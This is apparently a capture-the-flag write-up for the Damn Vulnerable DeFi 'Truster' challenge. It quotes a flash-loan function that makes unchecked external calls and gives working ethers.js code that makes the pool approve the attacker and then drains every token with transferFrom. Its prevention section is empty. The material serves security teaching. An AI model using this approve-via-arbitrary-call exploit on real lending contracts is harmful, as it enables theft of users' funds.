## What is our mission
More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

<br/>

## What are the smart contracts 
**`TrusterLenderPool.sol`**: smart contract that includes **`flashLoan(...)`** function 

<br/>


## Solution 
**1.** **`TrusterLenderPool.sol`** contract's **`flashLoan(...)`** function 

``` solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
```

**2.** The vulnarability cames from, **`TrusterLenderPool.sol`** contract's **`flashLoan(...)`** function.

**`TrusterLenderPool.sol`** contract **doesn't check** what are the 
**`address target`** 
&
**`bytes calldata data`** 
variables are.

⚠️ This is a vulnarability

pass **DVT token address** to **`address target`** variable.

pass **function approve(address to, uint256 amount)** to **`bytes calldata data`** variable.

And this will call **`approve`** function inside **`DVT token contract`**. And we will be able to transfer all tokens out of the pool 👌

<br/>

Here how you can do it,

```js
// test/truster/truster.challenge.js

it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        let abi = ["function approve(address to, uint256 amount)"];

        let iface = new ethers.utils.Interface(abi);

        const data = iface.encodeFunctionData("approve", [
        player.address,
        TOKENS_IN_POOL,
        ]);

        // we will aprove 'TOKENS_IN_POOL' tokens to 'player.address' after this call
        await pool.flashLoan(0, player.address, token.address, data);
        
        // transfer tokens from pool.address to player.address
        await token
        .connect(player)
        .transferFrom(pool.address, player.address, TOKENS_IN_POOL);

    });
```;
```

<br/>

## How could this exploit be prevented ?



<br/>


## How to test it
got to ➡️ [**Damn Vulnerable Defi - Chalange #1**](https://www.damnvulnerabledefi.xyz/challenges/3.html). Clone the repository as mentioned and put [**solution code**](Solution.txt) to his place.

Then you can just type **`npm run truster`**
